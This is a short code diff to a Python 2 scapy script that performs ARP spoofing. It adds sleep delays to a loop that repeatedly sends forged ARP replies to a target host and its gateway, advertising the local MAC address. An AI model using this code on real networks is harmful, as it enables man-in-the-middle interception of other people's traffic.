@@ -1,3 +1,4 @@
+import time
 from scapy.all import *
 from optparse import OptionParser
 import sys
@@ -28,8 +29,10 @@ def spoof(interface,tip,gip):
     try:
         while 1:
             sendp(target_pack,inter=2,iface=interface)
+            time.sleep(2)
             print "send arp reponse to target(%s),gateway(%s) macaddress is %s" %(tip,gip,local_mac)
             sendp(gateway_pack,inter=2,iface=interface)
+            time.sleep(2)
             print "send arp reponse to gateway(%s),target(%s) macaddress is %s" %(gip,tip,local_mac)
 
     except KeyboardInterrupt:
